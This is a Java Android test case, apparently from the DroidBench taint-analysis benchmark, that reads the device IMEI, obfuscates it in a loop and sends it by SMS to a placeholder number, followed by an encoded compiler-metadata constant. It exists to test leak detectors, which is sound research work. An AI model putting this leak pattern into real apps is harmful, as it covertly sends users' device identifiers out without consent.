package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Loop2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description tainted data is created and sent to a sink after it was
 transformed in a loop.
 * @dataflow source -> imei -> obfuscated -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle standard java constructs
 */
public class LoopExample2 extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loop_example2);
        TelephonyManager telephonyManager =
          (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId();
        String obfuscated = "";
        for (int i = 0; i < 10; i++)
            if (i == 9) for (char c : imei.toCharArray()) obfuscated += c + "_";
        SmsManager sm = SmsManager.getDefault();
        sm.sendTextMessage("+49 1234", null, obfuscated, null, null);
    }
    
    public LoopExample2() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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" +
       "qhgA/gHdcdC2wg8AAA==");
}
